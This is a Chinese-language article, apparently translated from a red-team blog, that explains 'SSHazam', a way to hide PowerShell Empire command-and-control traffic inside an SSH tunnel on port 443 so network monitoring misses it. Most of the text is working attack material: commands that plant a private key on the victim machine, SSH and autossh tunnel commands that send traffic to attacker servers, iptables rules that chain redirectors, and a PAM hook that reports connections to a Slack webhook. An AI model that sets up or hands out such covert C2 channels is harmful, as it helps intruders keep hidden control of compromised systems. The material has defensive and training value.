![1.jpg](https://image.3001.net/images/20190214/1550136236_5c6533ac2acb9.jpg!small)

**SSHazam这种技术可以帮助你将任何C2工具的通信流量隐藏在标准SSH通信信道中以躲避网络监测。**

## 直奔主题

在下面的演示样本中，我们会运行PowerShell
Empire，它会连接至目标用户的localhost端口。本地端口会通过一个SSH连接将流量转发至远程Empire服务器，这样检测工具检测到的流量就只有SSH流量了。目标系统为OS
X，但这种技术还可以利用Plink.exe【[下载地址](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.htmlhttps:/www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)】在Windows平台上实现。

  
![2.png](https://image.3001.net/images/20190214/1550136366_5c65342eb5b1d.png!small)  

上图显示的是，目标系统有一个监听端口5430的SSH信道，会将所有接收到的数据转发至Empire服务器。Empire服务器运行了Empire实例并在其localhost（127.0.0.1:5430）监听着相同的端口。为了更好地隐藏SSH流量，我们还让SSH服务器监听端口443，而不是标准端口22。别忘了修改SSH配置文件，来让它监听这个端口，然后修改云防火墙来允许流量通过。

你还需要在建立连接前往目标系统中拷贝一份私钥，对应的公钥必须添加到Empire服务器中的authorized_keys文件中。在演示样例中，我们会将私钥文件放在目标系统的~/.ssh/.do.key。下面的操作步骤需要在命令行中执行：

    
    
    mkdir~/.ssh
    
    chmod700 ~/.ssh
    
    echo-----BEGIN RSA PRIVATE KEY----- >> ~/.ssh/.do.key
    
    echoMIIJKAIBAAKCAgEArVuMJdwgl9z9s1C0mrYV05hwUevmY+CkJaY/1iiPJSE6/AAp >>~/.ssh/.do.key
    
    echo+qkMZ9nrHkBQtaQMrXPW5MQXLxU/o8LQ5QyPiy/B4FiGEfNSx//mSJvEYAXXN4zC >>~/.ssh/.do.key
    
    <snippedhere for brevity>
    
    echoRkiQ5Eir83CLCZFLRWV8wFvNkGV2krxMXDtHHFL5ars/J7tdBekmYI62eXnE5oXl >>~/.ssh/.do.key
    
    echoNHky2x6YsnQf5lOkC1XyWvwg77gR2kRhb9KpOi+hp6xB42o00mpbZgyY5V4= >>~/.ssh/.do.key
    
    echo-----END RSA PRIVATE KEY----- >> ~/.ssh/.do.key
    
    chmod600 ~/.ssh/.do.key

为了防止其他人访问这个私钥，你需要修改Empire服务器的配置。编辑/etx/passwd，并将登录路径修改为/bin/false：

    
    
    victim:x:1001:1001:VictimGuy,,,:/home/victim:/bin/false

将私钥存在目标系统中之后，只需要运行下列命令即可开启SSH信道和端口了：

    
    
    ssh -i~/.ssh/.do.key  -p 443 -N -f-oStrictHostKeyChecking=no victim@empire-server.corp.com -L 5430:127.0.0.1:5430

现在需要配置PowerShell
Empire，或者你自己的C2，来监听127.0.0.1:5430。此时，所有的C2流量都会隐藏在加密的SSH信道中，你也无需担心其他的网络监测工具了。

## 技术分析

这种技术其实非常简单，可以直接给到你C2会话。有时你可能不想把客户的敏感信息存放到第三方的云服务器中，这样你就需要设置一个额外的重定向工具来将云主机的流量转发到你自己的网络中了。整个流程大致如下图所示：

![3.png](https://image.3001.net/images/20190214/1550136398_5c65344edd272.png!small)  

C2连接会通过SSH信道转发至Empire重定向器。Empire重定向器的防火墙规则会将流量转发至另一个重定向器（中间件），然后建立逆向SSH连接将流量转发至最终的目的地。

需要在目标设备上运行的SSH命令如下：

    
    
    ssh-i ~/.ssh/.do.key  -p 443 -N -f-oStrictHostKeyChecking=no victim@empire-redirector.corp.com -L5430:127.0.0.1:5431

在攻击主机上运行的SSH命令如下：

    
    
    autossh-M 5431 -o ServerAliveInterval=30 -R 5433:10.10.10.185:5430 root@redirector.corp.com

你可能还需要先安装autossh，因为它可以让你的SSH信道长时间保持通信状态。

Empire重定向器的IP Table规则如下：

    
    
    iptables-t nat -A OUTPUT -m addrtype --src-type LOCAL --dst-type LOCAL -p tcp -mmultiport --dports 5430:65535 -j DNAT --to-destination 128.62.137.184:5432
    
    iptables-t nat -A POSTROUTING -m addrtype --src-type LOCAL --dst-type UNICAST -jMASQUERADE
    
    sysctl-w net.ipv4.conf.all.route_localnet=1

此时，工具会将端口5430至端口65535的流量全部转发至最终的重定向器，这样你就可以捕捉目标用户的全部流量了。

重定向器的IP Table规则如下：

    
    
    sysctl-w net.ipv4.conf.all.route_localnet=1
    
    iptables-t nat -I PREROUTING -p tcp --dport 5432 -j DNAT --to 127.0.0.1:5433

这看起来有些复杂，但是这种方法非常实用，可以保护你云端外的敏感数据。

如果你想在SSH连接建立成功之后收到通知的话，可以在/etc/pam.d/sshd文件中添加下列两行代码：

    
    
    session[success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.soopen
    
    sessionoptional pam_exec.so /home/root/ssh-slack-alert.sh

### 我的通知提醒脚本代码如下：

    
    
    #!/usr/bin/envbash
    
     
    
    if ["$PAM_USER" != "admin" ] && [ $PAM_TYPE !="close_session" ]
    
    then
    
    message="\`\`\`PamType:$PAM_TYPE\nSSH-User: $PAM_USER\nRhost: $PAM_RHOST\nServer: SSHazam\nHostname:`hostname`\`\`\`"
    
     
    
    curl-X POST \
    
      --data-urlencode"payload={\"channel\": \"alerts\",\"username\": \"SSHazam\", \"text\":\"${message}\", \"icon_emoji\": \":boom:\"}"\
    
     <https://hooks.slack.com/services/YOUR/SLACK/HOOKHERE>
    
    fi

大家赶紧动手尝试一下吧，希望可以给大家的Hack提供一些帮助！

 ***参考来源：[blackhillsinfosec](https://www.blackhillsinfosec.com/sshazam-hide-your-c2-inside-of-ssh/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

